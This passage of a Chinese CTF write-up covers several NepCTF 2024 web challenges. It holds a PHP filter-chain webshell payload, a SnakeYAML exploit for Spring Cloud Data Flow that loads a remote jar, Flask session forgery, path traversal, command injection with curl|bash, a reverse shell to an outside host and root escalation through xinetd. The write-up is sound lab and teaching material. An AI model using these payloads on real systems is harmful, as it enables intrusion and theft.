class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;j&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=index.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$final_payload</span>;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php</span><br></pre></td></tr></table></figure><p>放到 <code>1</code>里面发送过去，即可写马成功</p><p><img src="/NepCTF_2024/image-20240824164035342.png" alt="image-20240824164035342"></p><p>查看 <code>env</code> 得到flag</p><p><img src="/NepCTF_2024/image-20240824164104211.png" alt="image-20240824164104211"></p><h2 id="Always-RCE-First"><a href="#Always-RCE-First" class="headerlink" title="Always RCE First"></a>Always RCE First</h2><p>一个漏洞复现</p><p>参考链接：<a href="https://forum.butian.net/article/513">Spring Cloud Data Flow 漏洞分析（CVE-2024-22263|CVE-2024-37084）</a></p><p>按照文件的操作，先创建一个<code>package.yaml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="number">1.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">origin:</span> <span class="string">my</span> <span class="string">origin</span></span><br><span class="line"><span class="attr">repositoryId:</span> <span class="number">12345</span></span><br><span class="line"><span class="attr">repositoryName:</span> <span class="string">local</span></span><br><span class="line"><span class="attr">kind:</span> <span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;http://xxx/yaml-payload.jar&quot;</span>]]]]</span><br><span class="line"><span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">1.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>然后创建一个<code>test-1.1.1</code>，一起压缩进一个压缩包</p><p>接着用脚本转换得到 <code>packageFileAsBytes</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zip_to_byte_list</span>(<span class="params">zip_file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        zip_data = file.read()</span><br><span class="line">    <span class="keyword">return</span> [byte <span class="keyword">for</span> byte <span class="keyword">in</span> zip_data]</span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;test-1.1.1.zip&#x27;</span></span><br><span class="line">zip_byte_list = zip_to_byte_list(zip_file_path)</span><br><span class="line"><span class="built_in">print</span>(zip_byte_list)</span><br></pre></td></tr></table></figure><p>接着在这个 <a href="https://github.com/artsploit/yaml-payload">项目</a> 下载源码并修改，修改完成后打包成jar包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>把 jar包放服务器，并用python启动一个http服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure><p>发包</p><p><img src="/NepCTF_2024/image-20240824213816687.png" alt="image-20240824213816687"></p><p>反弹shell成功，直接读flag即可</p><p><img src="/NepCTF_2024/image-20240824212528847.png" alt="image-20240824212528847"></p><h2 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h2><p>审计源码，可以看到在<code>/admin/dashboard</code> 路由下可以<code>RCE</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;admin_logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span></span><br><span class="line">        filename = file.filename</span><br><span class="line">        file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line">    cmd_output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;cmd&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;lock.txt&quot;</span>):  <span class="comment"># 检查当前目录下是否存在lock.txt</span></span><br><span class="line">            cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd_output = subprocess.check_output(cmd, shell=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                cmd_output = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd_output = <span class="string">&quot;lock.txt not found. Command execution not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="string">&quot;cmdExecute&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在次之前，要先保证<code>session.get(&#39;admin_logged_in&#39;)</code>成立，发现源码已经给了<code>app.secret_key = &quot;super_secret_key&quot;</code>，那么可以直接 <code>session伪造</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;username&#x27;: &#x27;HRP&#x27;,&#x27;admin_logged_in&#x27;: true&#125;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s super_secret_key -t &quot;&#123;&#x27;username&#x27;: &#x27;HRP&#x27;,&#x27;admin_logged_in&#x27;: True&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJ1c2VybmFtZSI6IkhSUCIsImFkbWluX2xvZ2dlZF9pbiI6dHJ1ZX0.Zsnvog.93hWSohyVwbqbd_9ZWvkmuhrBHg</span><br></pre></td></tr></table></figure><p>然后用一个前端上传文件，抓包，修改上传文件名为<code>../../lock.txt</code>，并带上 Cookie</p><p><img src="/NepCTF_2024/image-20240825182446670.png" alt="image-20240825182446670"></p><p>上传成功后，即可<code>RCE</code></p><p><img src="/NepCTF_2024/image-20240825182535622.png" alt="image-20240825182535622"></p><p>反弹shell，然后发现<code>flag</code>没权限读取</p><p><img src="/NepCTF_2024/image-20240825183146806.png" alt="image-20240825183146806"></p><p>查看进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -axu</span><br></pre></td></tr></table></figure><p><img src="/NepCTF_2024/image-20240825183221657.png" alt="image-20240825183221657"></p><p>再结合提示，观察有哪些应用是 root 启动的，可以看到一个<code>/usr/sbin/xinetd</code></p><p>去查找它对应配置文件的位置（拷打GPT）</p><p><img src="/NepCTF_2024/image-20240825183427921.png" alt="image-20240825183427921"></p><p>查看<code>etc/xinetd.d/</code></p><p><img src="/NepCTF_2024/image-20240825183531028.png" alt="image-20240825183531028"></p><p>可以看到<code>pwnservice</code>有写入的权限，查看<code>pwnservice</code></p><p><img src="/NepCTF_2024/image-20240825183633124.png" alt="image-20240825183633124"></p><p>可以看到是通过<code>8888</code>端口建立了连接</p><p>这里可以通过修改<code>pwnservice</code>的<code>server_args = -c &quot;/home/ctfuser/start.sh&quot;</code>为<code>/bin/sh</code>，nc连接上就是root，也可以像我这样修改<code>/home/ctfuser/start.sh</code>，我们也有<code>/home/ctfuser/start.sh</code>的写权限</p><p>修改<code>/home/ctfuser/start.sh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;;chmod 777 /home/ctfuser/*&quot; &gt;&gt; /home/ctfuser/start.sh</span><br></pre></td></tr></table></figure><p><img src="/NepCTF_2024/image-20240825183956397.png" alt="image-20240825183956397"></p><p>然后建立与<code>8888</code>端口的<code>socket</code>连接，让脚本执行。</p><p>用python建立 socket 连接 （也可以用nc，一开始没注意到）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import socket;sock = socket.socket();sock.connect((&#x27;127.0.0.1&#x27;, 8888));&quot;</span><br><span class="line"></span><br><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure><p><img src="/NepCTF_2024/image-20240825184136904.png" alt="image-20240825184136904"></p><p>成功获得<code>flag</code>的读取权限，直接查看即可得到flag</p><h2 id="NepRouter"><a href="#NepRouter" class="headerlink" title="NepRouter"></a>NepRouter</h2><h3 id="NepRouter-狸猫换太子"><a href="#NepRouter-狸猫换太子" class="headerlink" title="NepRouter-狸猫换太子"></a>NepRouter-狸猫换太子</h3><p>按照要求建立好连接（</p><p>我这里是用 bp 来代理的，后边都是用 bp 的内置浏览器做题</p><p><img src="/NepCTF_2024/image-20240825190334160.png" alt="image-20240825190334160"></p><p>先把执行一次注册+登陆的操作</p><p>随便上传一个文件，之后成功注册<code>TEST</code>用户，然后登陆上去。</p><p>点击<code>Download Now</code> 能下载下来一个文件，</p><p>同时点进<code>/about</code>，通过审查源码，发现有一个<code>8080</code>端口。</p><p><img src="/NepCTF_2024/image-20240825190558492.png" alt="image-20240825190558492"></p><p>这里就会出现一个问题，如果直接访问<code>8080</code>，会报<code>Burp Suite Professional</code>，因为<code>bp</code>占用了<code>8080</code>端口，需要修改一下 bp 的监听端口</p><p><img src="/NepCTF_2024/image-20240825190800692.png" alt="image-20240825190800692"></p><p>在这里将 8080 改成 8081，接着回到浏览器，访问<code>127.0.0.1:8080</code>，来到一个新页面</p><p><img src="/NepCTF_2024/image-20240825191313445.png" alt="image-20240825191313445"></p><p>接着分析下载下来的文件，用 ida 分析</p><p>翻看到<code>sub_1ACE</code>函数，可以看到一个用户名</p><p><img src="/NepCTF_2024/image-20240825191526205.png" alt="image-20240825191526205"></p><p>那么接下来应该要伪造这个用户。</p><p>接着回到 <code>5000</code> 端口的网站，翻看 BP 的历史访问记录，可以看到在点击注册时，会发送一个加密后的用户名</p><p><img src="/NepCTF_2024/image-20240825191753174.png" alt="image-20240825191753174"></p><p>重新回到发送<code>register</code>前，观察前端，发现当我们上传完文件后，前端会出现一个<code>TEST</code>，再次点击注册，就会注册成功<code>TEST</code>用户，猜测它加密时用的字符串是从这个位置取的</p><p><img src="/NepCTF_2024/image-20240825192008292.png" alt="image-20240825192008292"></p><p>修改前端，把 <code>TEST</code> 改成 <code>NepNepIStheBestTeam</code></p><p><img src="/NepCTF_2024/image-20240825192051064.png" alt="image-20240825192051064"></p><p>然后再点<code>Register</code>，注册成功后发现能用这个账号登陆，说明我们可以通过修改前端改数据</p><p>接着来到<code>8080</code>的网站，用 <code>NepNepIStheBestTeam</code> 登陆，可以登陆上网页</p><p><img src="/NepCTF_2024/image-20240825192414944.png" alt="image-20240825192414944"></p><p>这里有一个填地址的地方，抓一下这里的包</p><p><img src="/NepCTF_2024/image-20240825193247286.png" alt="image-20240825193247286"></p><p>可以看到是请求了<code>/setrouter</code>路由，对应上<code>router</code> 中的<code>sub_1E91</code>逻辑</p><p><img src="/NepCTF_2024/image-20240825193450287.png" alt="image-20240825193450287"></p><p>可以看到最后是走到了一个<code>sub_1979</code>，点进去查看，发现可以 RCE</p><p><img src="/NepCTF_2024/image-20240825193546560.png" alt="image-20240825193546560"></p><p>用<code>curl</code>探测一下，发现能够出网带出数据，这里有一点小坑就是，请求的参数里不能有空格，可以用<code>$&#123;IFS&#125;</code>来代替空格</p><p>导致这个现象发生是因为这里</p><p><img src="/NepCTF_2024/image-20240825193754755.png" alt="image-20240825193754755"></p><p>这里用了空格作为分割符来分割字符串，如果我们传进去的参数带有空格就会被分割了，从而丢掉了空格后边的数据</p><p>探测出网：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setrouter?ip_address=123;curl$&#123;IFS&#125;xxxx:2333</span><br></pre></td></tr></table></figure><p>vps 收到了数据</p><p>接着反弹shell，同上面的原因，一样不能使用<code>&amp;</code>这个字符，我是使用<code>curl</code>来执行远程的<code>bash</code>文件</p><p>vps用户python启动一个http</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 2334</span><br></pre></td></tr></table></figure><p>sh里写反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>接着靶机执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setrouter?ip_address=123;curl$&#123;IFS&#125;xxxx:2334/sh|bash</span><br></pre></td></tr></table></figure><p>成功弹上shell</p><p><img src="/NepCTF_2024/image-20240825194657450.png" alt="image-20240825194657450"></p><p>直接 <code>cat README.txt</code>，得到flag1</p><p><img src="/NepCTF_2024/image-20240825194740404.png" alt="image-20240825194740404"></p><h3 id="NepRouter-白给"><a href="#NepRouter-白给" class="headerlink" title="NepRouter-白给"></a>NepRouter-白给</h3><p>查看进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -axu</span><br></pre></td></tr></table></figure><p><img src="/NepCTF_2024/image-20240825194908032.png" alt="image-20240825194908032"></p><p>收集到一些信息：</p><p><code>blood-pool-HRP</code> 运行在 <code>9999</code> 端口，浏览器访问验证一下发现能访问</p><p><img src="/NepCTF_2024/image-20240825195053328.png" alt="image-20240825195053328"></p><p>此时可以看到，这里需要我们输入<code>flag</code>，把程序扒下来看一下。</p><p>先cd 到 <code>/blood-pool</code> ，然后看一下有什么</p><p><img src="/NepCTF_2024/image-20240825195259416.png" alt="image-20240825195259416"></p><p>发现有一个<code>flag.txt</code>，但没权限读，<code>ssh.txt</code>里面是一个用户</p><p>熟悉的操作，在靶机用python启动一个<code>http</code>服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure><p><img src="/NepCTF_2024/image-20240825195431476.png" alt="image-20240825195431476"></p><p>然后把 <code>blood-pool-HRP</code> 下载下来</p><p>接着把python服务终止掉，重新反弹shell</p><p>反编译程序，可以发现<code>flag</code>是从数据库中查的。</p><p><img src="/NepCTF_2024/image-20240826060416711.png" alt="image-20240826060416711"></p><p>在<code>main_initDB</code>中可以看到数据库名<code>TradeSecrets</code></p><p><img src="/NepCTF_2024/image-20240826060327422.png" alt="image-20240826060327422"></p><p>接着查数据库，直接用<code>mysql</code>查不了，可以用python连数据库查</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import mysql.connector;DB_CONFIG = &#123;&#x27;host&#x27;: &#x27;localhost&#x27;,&#x27;user&#x27;: &#x27;root&#x27;,&#x27;password&#x27;: &#x27;Nep+-*/HRP123456789&#x27;,&#x27;database&#x27;:&#x27;TradeSecrets&#x27;&#125;;db = mysql.connector.connect(**DB_CONFIG);cursor = db.cursor();cursor.execute(&#x27;select * from flag&#x27;);res = cursor.fetchone();print(res);cursor.close();db.close()&quot;</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 